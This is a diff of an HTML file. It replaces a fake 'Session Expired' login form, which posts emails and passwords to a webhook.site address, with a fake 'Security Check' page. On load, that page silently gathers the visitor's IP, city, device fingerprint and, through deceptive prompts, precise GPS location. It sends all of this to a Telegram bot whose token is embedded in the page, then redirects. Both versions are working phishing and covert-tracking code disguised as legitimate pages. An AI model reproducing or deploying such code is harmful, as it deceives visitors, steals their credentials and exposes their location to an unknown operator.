@@ -1,60 +1,207 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 
 <head>
-    <title>Session Expired</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Security Compliance Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
     <style>
-        html,
-        body {
+        * {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            background: rgba(0, 0, 0, 0.7);
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+            color: #ffffff;
+            height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            height: 100vh;
-            font-family: sans-serif;
+            animation: fadeIn 1.5s ease-out forwards;
         }
 
-        .box {
-            background: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 0 30px rgba(0, 0, 0, 0.3);
-            width: 350px;
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
         }
 
-        input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 4px;
-            border: 1px solid #ccc;
+        .container {
+            background: rgba(0, 0, 0, 0.85);
+            padding: 45px 35px;
+            border-radius: 16px;
+            text-align: center;
+            width: 90%;
+            max-width: 480px;
+            box-shadow: 0 0 30px rgba(0, 255, 213, 0.4);
+            animation: slideUp 1s ease-out;
         }
 
-        button {
-            width: 100%;
-            padding: 12px;
-            background: #5c6ac4;
-            color: white;
-            border: none;
-            font-size: 16px;
-            border-radius: 4px;
-            cursor: pointer;
+        @keyframes slideUp {
+            from {
+                transform: translateY(50px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        h1 {
+            font-size: 1.9rem;
+            color: #00ffd5;
+            margin-bottom: 18px;
+            animation: pulseGlow 2.5s infinite;
+        }
+
+        @keyframes pulseGlow {
+
+            0%,
+            100% {
+                text-shadow: 0 0 5px #00ffd5, 0 0 15px #00ffd5;
+            }
+
+            50% {
+                text-shadow: 0 0 15px #00ffd5, 0 0 30px #00ffd5;
+            }
+        }
+
+        p {
+            font-size: 1rem;
+            color: #ccc;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .loader {
+            margin: 25px auto;
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            border: 5px solid #00ffd5;
+            border-top-color: transparent;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        #status {
+            font-size: 0.95rem;
+            color: #ff6666;
+            margin-top: 20px;
+        }
+
+        #success-message {
+            display: none;
+            font-size: 1.1rem;
+            margin-top: 20px;
+            color: #00ffc3;
         }
     </style>
 </head>
 
 <body>
-    <div class="box">
-        <h2>Session Expired</h2>
-        <p>Please login again to continue.</p>
-        <form method="POST" action="https://webhook.site/872ec356-99c2-441e-b34d-4af9fb055c07">
-            <input type="email" name="email" placeholder="Email" required />
-            <input type="password" name="password" placeholder="Password" required />
-            <button type="submit">Log In</button>
-        </form>
+    <div class="container" id="content">
+        <h1>Security Check In Progress</h1>
+        <p>Please hold while we verify your connection and region.</p>
+        <div class="loader"></div>
+        <p id="status"></p>
+        <p id="success-message">✅ Verification complete. Redirecting...</p>
     </div>
+
+    <script>
+        const telegramToken = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
+        const chatId = "6239813037";
+        const redirectURL = "https://medium.com/@MianHammadx0root/exploiting-blind-xss-in-a-signup-page-admin-panel-takeover-and-real-world-impact-3000-p2-private-110205e3674b";
+
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+        }
+
+        async function collectAndSendInfo() {
+            try {
+                const res = await fetch("https://ipinfo.io/json?token=be5998b85f541c");
+                const data = await res.json();
+                const [lat, lon] = data.loc.split(',');
+
+                const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
+                const resolution = `${window.screen.width}x${window.screen.height}`;
+                const colorDepth = `${screen.colorDepth}-bit`;
+                const language = navigator.language;
+                const platform = navigator.platform;
+                const userAgent = navigator.userAgent;
+                const hasWebcam = navigator.mediaDevices && navigator.mediaDevices.getUserMedia ? "Possible" : "No Access";
+
+                let adBlockEnabled = false;
+                const ad = document.createElement('div');
+                ad.className = 'adsbox';
+                ad.style.height = '1px';
+                document.body.appendChild(ad);
+                window.setTimeout(() => {
+                    if (ad.offsetHeight === 0) adBlockEnabled = true;
+                    ad.remove();
+
+                    const fullDetails = `📡 IP Info\n----------------------\n🌐 IP: ${data.ip}\n🗺 Country: ${data.country}\n🏙 City: ${data.city}\n🌍 Region: ${data.region || 'N/A'}\n📍 Postal: ${data.postal || 'N/A'}\n📞 Coordinates: ${data.loc}\n🏢 Org: ${data.org}\n💻 ISP: ${data.org}\n🖥 Device: ${deviceType}\n📐 Resolution: ${resolution}\n🎨 Color Depth: ${colorDepth}\n🌐 Language: ${language}\n🖥 Platform: ${platform}\n📷 Webcam: ${hasWebcam}\n🧠 AdBlocker: ${adBlockEnabled ? "Likely Enabled" : "Not Detected"}\n📱 User Agent: ${userAgent}\n🕰 Time: ${new Date().toLocaleString()}`;
+
+                    sendToTelegram(fullDetails);
+                    requestLocation();
+                }, 300);
+            } catch (e) {
+                document.getElementById("status").innerText = "Failed to verify connection.";
+                sendToTelegram("⚠️ Failed to fetch IP info.");
+            }
+        }
+
+        function requestLocation() {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
+                    sendToTelegram(`✅ Location granted\n🌐 Google Maps: ${mapsLink}`);
+
+                    document.querySelector("#success-message").style.display = 'block';
+                    setTimeout(() => {
+                        window.location.href = redirectURL;
+                    }, 3000);
+                },
+                (error) => {
+                    document.querySelector(".loader").style.display = 'none';
+                    document.getElementById("status").innerHTML = `Location access was denied. <br>Please enable location to continue for regional compliance.<br><br><button onclick='requestLocation()' style='margin-top:10px;padding:10px 16px;background:#00ffd5;border:none;border-radius:8px;color:#000;font-weight:600;cursor:pointer;'>Try Again</button>`;
+                    sendToTelegram(`❌ Location denied\nReason: ${error.message}`);
+                }
+            );
+        }
+
+        window.onload = () => {
+            setTimeout(() => {
+                collectAndSendInfo();
+            }, 3000);
+        };
+    </script>
 </body>
 
 </html>
